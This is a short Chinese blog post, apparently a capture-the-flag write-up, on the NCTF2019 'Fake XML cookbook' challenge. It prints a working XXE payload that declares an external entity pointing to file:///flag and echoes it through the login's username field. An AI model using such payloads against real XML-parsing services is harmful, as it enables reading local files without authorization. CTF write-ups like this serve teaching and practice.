---
title: "XXE相关"
date: 2020-04-14
description: "记录CTF中遇到的XXE题型"
tags: ["XXE"]
categories: ["CTF"]
---

## [NCTF2019]Fake XML cookbook

- 抓包，xml形式提交登录

- 裸的XXE，盲猜flag位于根目录

- payload:

  ```xml-dtd
  <!DOCTYPE user
  [
  <!ELEMENT user (username,password)>
  <!ELEMENT username ANY>
  <!ELEMENT password (#PCDATA)>
  <!ENTITY flag SYSTEM "file:///flag">
  ]>
  <user><username>&flag;</username><password>123</password></user>
  ```

